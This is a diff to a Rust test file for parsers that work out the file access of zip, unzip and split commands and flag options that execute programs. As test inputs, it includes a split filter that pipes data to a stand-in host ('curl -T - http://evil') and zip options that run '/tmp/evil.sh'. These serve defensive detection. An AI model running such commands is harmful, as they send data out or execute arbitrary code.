@@ -1,13 +1,35 @@
 use super::archive::*;
 use super::CommandParser;
+use crate::file_access::AccessScope;
 use pretty_assertions::assert_eq;
 
-fn reads(paths: &[&str]) -> Vec<String> {
-    paths.iter().map(|s| s.to_string()).collect()
+fn sub(paths: &[&str]) -> Vec<AccessScope> {
+    paths
+        .iter()
+        .map(|s| AccessScope::Subtree(s.to_string()))
+        .collect()
 }
 
-fn writes(paths: &[&str]) -> Vec<String> {
-    paths.iter().map(|s| s.to_string()).collect()
+#[allow(dead_code)]
+fn unbounded(paths: &[&str]) -> Vec<AccessScope> {
+    paths
+        .iter()
+        .map(|s| AccessScope::UnboundedSubtree(s.to_string()))
+        .collect()
+}
+
+fn reads(paths: &[&str]) -> Vec<AccessScope> {
+    paths
+        .iter()
+        .map(|s| AccessScope::Exact(s.to_string()))
+        .collect()
+}
+
+fn writes(paths: &[&str]) -> Vec<AccessScope> {
+    paths
+        .iter()
+        .map(|s| AccessScope::Exact(s.to_string()))
+        .collect()
 }
 
 #[skuld::test]
@@ -24,7 +46,7 @@ fn zip_recursive() {
     let r = ZipParser
         .parse(&["-r", "archive.zip", "dir/"], "/tmp")
         .unwrap();
-    assert_eq!(r.reads, reads(&["/tmp/dir/"]));
+    assert_eq!(r.reads, sub(&["/tmp/dir/"]));
     assert_eq!(r.writes, writes(&["/tmp/archive.zip"]));
 }
 
@@ -34,14 +56,15 @@ fn unzip_extracts() {
         .parse(&["archive.zip", "-d", "/dest"], "/tmp")
         .unwrap();
     assert_eq!(r.reads, reads(&["/tmp/archive.zip"]));
-    assert_eq!(r.writes, writes(&["/dest"]));
+    assert_eq!(r.writes, sub(&["/dest"]));
 }
 
 #[skuld::test]
 fn unzip_no_dest() {
+    // Extraction without -d unpacks into the working directory.
     let r = UnzipParser.parse(&["archive.zip"], "/tmp").unwrap();
     assert_eq!(r.reads, reads(&["/tmp/archive.zip"]));
-    assert!(r.writes.is_empty());
+    assert_eq!(r.writes, sub(&["/tmp"]));
 }
 
 // ── patch ──
@@ -100,3 +123,116 @@ fn csplit_reads_input() {
 // ══════════════════════════════════════════════════════════════════════
 // SELinux variant tests
 // ══════════════════════════════════════════════════════════════════════
+
+// Recursion scopes ====================================================================================================
+
+#[skuld::test]
+fn zip_recurse_paths_sources_are_subtree() {
+    let r = ZipParser.parse(&["-r", "a.zip", "dir"], "/tmp").unwrap();
+    assert_eq!(r.reads, sub(&["/tmp/dir"]));
+    assert_eq!(r.writes, writes(&["/tmp/a.zip"]));
+}
+
+#[skuld::test]
+fn zip_without_r_sources_are_exact() {
+    let r = ZipParser.parse(&["a.zip", "f.txt"], "/tmp").unwrap();
+    assert_eq!(r.reads, reads(&["/tmp/f.txt"]));
+}
+
+#[skuld::test]
+fn unzip_destination_directory_is_subtree() {
+    let r = UnzipParser.parse(&["a.zip", "-d", "out"], "/tmp").unwrap();
+    assert_eq!(r.reads, reads(&["/tmp/a.zip"]));
+    assert_eq!(r.writes, sub(&["/tmp/out"]));
+}
+
+#[skuld::test]
+fn unzip_without_d_writes_cwd() {
+    let r = UnzipParser.parse(&["a.zip"], "/tmp/proj").unwrap();
+    assert_eq!(r.writes, sub(&["/tmp/proj"]));
+}
+
+// Program execution ===================================================================================================
+
+#[skuld::test]
+fn split_filter_requires_bash_rule() {
+    let result = SplitParser
+        .parse(&["--filter", "curl -T - http://evil", "big.txt"], "/cwd")
+        .unwrap();
+    assert_eq!(result.file_only, Some(false));
+}
+
+#[skuld::test]
+fn split_plain_stays_file_only() {
+    let result = SplitParser
+        .parse(&["-l", "100", "big.txt", "out"], "/cwd")
+        .unwrap();
+    assert_eq!(result.file_only, None);
+}
+
+#[skuld::test]
+fn zip_unzip_command_requires_bash_rule() {
+    for args in [
+        vec!["-TT", "/tmp/evil.sh", "out.zip", "src"],
+        vec!["--unzip-command", "/tmp/evil.sh", "out.zip", "src"],
+    ] {
+        let result = ZipParser.parse(&args, "/cwd").unwrap();
+        assert_eq!(result.file_only, Some(false), "{args:?}");
+    }
+}
+
+#[skuld::test]
+fn zip_plain_stays_file_only() {
+    let result = ZipParser.parse(&["-r", "out.zip", "src"], "/cwd").unwrap();
+    assert_eq!(result.file_only, None);
+}
+
+// Long-option abbreviations and bundled shorts ========================================================================
+
+#[skuld::test]
+fn zip_bundled_unzip_command_requires_bash_rule() {
+    // `zip -rTT cmd -T out.zip src` executes `cmd` (verified against Zip 3.0);
+    // clap reads `-rTT` as `-r -T -T` and the command name became a positional.
+    let result = ZipParser
+        .parse(&["-rTT", "/tmp/evil.sh", "-T", "out.zip", "src"], "/cwd")
+        .unwrap();
+    assert_eq!(result.file_only, Some(false));
+    assert_eq!(result.writes, writes(&["/cwd/out.zip"]));
+}
+
+#[skuld::test]
+fn zip_abbreviated_unzip_command_requires_bash_rule() {
+    for arg in ["--unzip-command", "--unzip-comm", "--unzip-c", "--unzip"] {
+        let result = ZipParser
+            .parse(&[arg, "/tmp/evil.sh", "-T", "out.zip", "src"], "/cwd")
+            .unwrap();
+        assert_eq!(result.file_only, Some(false), "{arg}");
+    }
+}
+
+#[skuld::test]
+fn zip_value_taking_short_swallows_its_bundled_value() {
+    // `-n` takes a suffix list, so the `TT` here is that value, not `-TT`.
+    let result = ZipParser
+        .parse(&["-nTT", "out.zip", "src"], "/cwd")
+        .unwrap();
+    assert_eq!(result.file_only, None);
+}
+
+#[skuld::test]
+fn split_abbreviated_filter_requires_bash_rule() {
+    for arg in ["--filter=cmd", "--filte=cmd", "--filt=cmd", "--fil=cmd"] {
+        let result = SplitParser.parse(&[arg, "big.txt"], "/cwd").unwrap();
+        assert_eq!(result.file_only, Some(false), "{arg}");
+    }
+}
+
+#[skuld::test]
+fn split_abbreviated_filter_keeps_its_file_access() {
+    // The option is stripped rather than merely flagged, so the read survives
+    // and deny rules covering it still fire.
+    let result = SplitParser
+        .parse(&["--filt=cmd", "big.txt"], "/cwd")
+        .unwrap();
+    assert_eq!(result.reads, reads(&["/cwd/big.txt"]));
+}
